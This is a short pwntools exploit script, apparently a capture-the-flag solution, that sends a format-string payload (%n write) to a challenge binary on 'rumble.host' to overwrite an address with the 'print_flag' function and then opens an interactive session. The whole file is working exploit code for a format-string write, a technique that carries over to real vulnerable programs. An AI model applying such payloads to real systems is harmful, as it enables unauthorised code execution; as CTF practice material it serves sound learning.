#!/usr/bin/python3

from pwn import *

exe = ELF('binary', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000401961

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('rumble.host', 20776)
else:
        p = process(exe.path)

GDB()
sla(b"date:", b"123")
payload = f"%{exe.sym['print_flag']}c%14$n".encode()
payload = payload.ljust(16, b"a")
payload += p64(0x404028)
sla(b"location:", payload)
p.interactive()
